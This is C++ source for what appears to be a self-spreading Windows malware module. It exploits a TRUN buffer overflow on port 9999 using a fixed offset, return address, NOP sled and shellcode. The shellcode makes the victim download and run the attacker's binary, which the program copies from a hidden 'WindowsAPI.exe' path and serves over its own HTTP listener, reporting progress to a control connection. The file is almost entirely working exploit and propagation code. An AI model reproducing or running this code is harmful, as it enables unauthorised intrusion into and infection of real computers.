#include <ws2tcpip.h>
#include <iostream>
#include <fstream>

std::string OwnIP()
{
	PHOSTENT hostinfo;
	WSADATA some_kind_of_data;
    WSAStartup(MAKEWORD(2, 2), &some_kind_of_data);
	char name[255];
	std::string ip;
	gethostname ( name, sizeof(name));
	hostinfo = gethostbyname(name);
	ip = inet_ntoa (*(struct in_addr *)*hostinfo->h_addr_list);
	return ip;
}

std::string GetOwnFile()
{
	std::string B = "C:\\users\\";
	std::string E = "\\AppData\\Local\\home\\WindowsAPI.exe";
	std::string HOME = B+Username()+E;
	std::ifstream infile(HOME);
	if(infile.good()){
		return HOME;
	}
  char buffer[MAX_PATH];
  GetModuleFileName( NULL, buffer, MAX_PATH );
  return std::string(buffer);
}

void upload(SOCKET Connection)
{
	WSADATA some_kind_of_data;
	WSAStartup(MAKEWORD(2, 2), &some_kind_of_data);

	sockaddr_in listen_address;
	listen_address.sin_family = AF_INET;
	listen_address.sin_port = htons(80);
	listen_address.sin_addr.S_un.S_addr = INADDR_ANY;

	SOCKET listen_socket = socket(AF_INET, SOCK_STREAM, 0);

	bind(listen_socket, (sockaddr*)&listen_address, sizeof(listen_address));

	listen(listen_socket, SOMAXCONN);

	sockaddr_in client;
	int clientSize = sizeof(client);

	SOCKET clientSocket = accept(listen_socket, (sockaddr*)&client, &clientSize);

	char *connected_ip = inet_ntoa(client.sin_addr);
	int port = ntohs(client.sin_port);

	Send(Connection,"[+] Target is downloading payload");
	std::cout << "[*] " << connected_ip << " Connected on PORT:" << port << "\n";

    std::ifstream input(GetOwnFile(), std::ios::binary );

    std::string buffer(std::istreambuf_iterator<char>(input), {});

	send(clientSocket, buffer.c_str(), buffer.size(), 0);
	Sleep(2000);
	std::cout << "[+] " << connected_ip << " Exploited\n";
	closesocket(clientSocket);
	WSACleanup();

}

int Exploit(std::string ip,SOCKET Connection) {
  int port = 9999;
	std::string own_ip = OwnIP();
	Send(Connection,"[*] Trying to exploit: "+ip);
    WSADATA some_kind_of_data;
    WSAStartup(MAKEWORD(2, 2), &some_kind_of_data);

    HOSTENT *host = gethostbyname(ip.c_str());
    sockaddr_in connect_adress;
    connect_adress.sin_family = AF_INET;
    connect_adress.sin_port = htons(port);

    memcpy(&connect_adress.sin_addr.S_un.S_addr, host->h_addr_list[0], sizeof(connect_adress.sin_addr.S_un.S_addr));

    SOCKET connection_socket = socket(AF_INET, SOCK_STREAM, 0);

    connect(connection_socket, (sockaddr*)&connect_adress, sizeof(connect_adress));
		Send(Connection,"[+] Target is vulnurable!");

 	char msg[1024]{ 0 };

	int r = recv(connection_socket, msg, sizeof(msg), 0);
	if(r==-1)
	{
	    return 1;
	}else{
		std::string link = "http://" + own_ip + "/";
		std::string shellcode = "\x33\xC9\x64\x8B\x41\x30\x8B\x40\x0C\x8B\x70\x14\xAD\x96\xAD\x8B\x58\x10\x8B\x53\x3C\x03\xD3\x8B\x52\x78\x03\xD3\x8B\x72\x20\x03\xF3\x33\xC9\x41\xAD\x03\xC3\x81\x38\x47\x65\x74\x50\x75\xF4\x81\x78\x04\x72\x6F\x63\x41\x75\xEB\x81\x78\x08\x64\x64\x72\x65\x75\xE2\x8B\x72\x24\x03\xF3\x66\x8B\x0C\x4E\x49\x8B\x72\x1C\x03\xF3\x8B\x14\x8E\x03\xD3\x33\xC9\x51\x68\x2E\x65\x78\x65\x68\x64\x65\x61\x64\x53\x52\x51\x68\x61\x72\x79\x41\x68\x4C\x69\x62\x72\x68\x4C\x6F\x61\x64\x54\x53\xFF\xD2\x83\xC4\x0C\x59\x50\x51\x66\xB9\x6C\x6C\x51\x68\x6F\x6E\x2E\x64\x68\x75\x72\x6C\x6D\x54\xFF\xD0\x83\xC4\x10\x8B\x54\x24\x04\x33\xC9\x51\x66\xB9\x65\x41\x51\x33\xC9\x68\x6F\x46\x69\x6C\x68\x6F\x61\x64\x54\x68\x6F\x77\x6E\x6C\x68\x55\x52\x4C\x44\x54\x50\xFF\xD2\x33\xC9\x8D\x54\x24\x24\x51\x51\x52\xEB\x47\x51\xFF\xD0\x83\xC4\x1C\x33\xC9\x5A\x5B\x53\x52\x51\x68\x78\x65\x63\x61\x88\x4C\x24\x03\x68\x57\x69\x6E\x45\x54\x53\xFF\xD2\x6A\x05\x8D\x4C\x24\x18\x51\xFF\xD0\x83\xC4\x0C\x5A\x5B\x68\x65\x73\x73\x61\x83\x6C\x24\x03\x61\x68\x50\x72\x6F\x63\x68\x45\x78\x69\x74\x54\x53\xFF\xD2\xFF\xD0\xE8\xB4\xFF\xFF\xFF";
		std::string new_eip = "\x03\x12\x50\x62";
		std::string trun = "TRUN /:./";
		std::string nop_sled(16,'\x90');

		int total_length = 2984;
		int offset = 2003;
		int ending_offset = total_length - offset - shellcode.length() - trun.length() - new_eip.length() - nop_sled.length();

		std::string crash(offset, 'A');
		std::string ending(ending_offset,'C');

		std::string payload = trun + crash + new_eip + nop_sled + shellcode + link.c_str() + ending;

		send(connection_socket, payload.c_str(), payload.length(), 0);
		Send(Connection,"[*] Sent Payload, now waiting for a connection back");
    Sleep(1000);
		upload(Connection);
	}
	return 0;

}
